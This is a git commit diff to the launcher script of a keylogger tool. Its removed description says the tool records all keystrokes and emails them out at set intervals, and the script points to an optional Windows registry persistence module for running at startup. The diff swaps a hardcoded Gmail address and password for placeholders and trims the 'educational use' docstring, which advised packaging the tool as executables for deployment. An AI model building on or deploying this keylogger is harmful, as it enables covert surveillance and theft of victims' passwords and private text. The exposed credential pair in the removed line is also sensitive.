7c0a4167296fc2bba3c0e671b10792626918ea7a
haocheng1 <37055733+haocheng1@users.noreply.github.com>
2019-10-06 14:40:55 -0400

    Update execute_keylogger.py

--- execute_keylogger.py
+++ execute_keylogger.py
@@ -2,20 +2,13 @@
 import keylogger
 
 # OR if you are packaging on Windows and want to add to registry
-# So that the program runs on startup, uncomment the following import and comment the top one
 
 #import keylogger_persistance_windows
 
 '''
-Description: This tool is part of the Ethical Hacking toolset. This is for educational use ONLY for security purposes.
-The keylogger takes the all key strikes on keyboard and send them to an email every specific period of time
-Requirements: You need only to install pynput
-          		'pip install pynput'
-          		Use packaged executables for Mac OS, Linux and MS Windows for deployment
-Usage: python keylogger.py  or better for deployment to chnage source code and package the app as executables
-Enjoy!
+Keylogger
 '''
 
 #Main program
-my_keylogger = keylogger.Keylogger(120, "keylog6050@gmail.com", "tty49046237")
+my_keylogger = keylogger.Keylogger(120, "tyep_your_email_here", "password_here")
 my_keylogger.start()
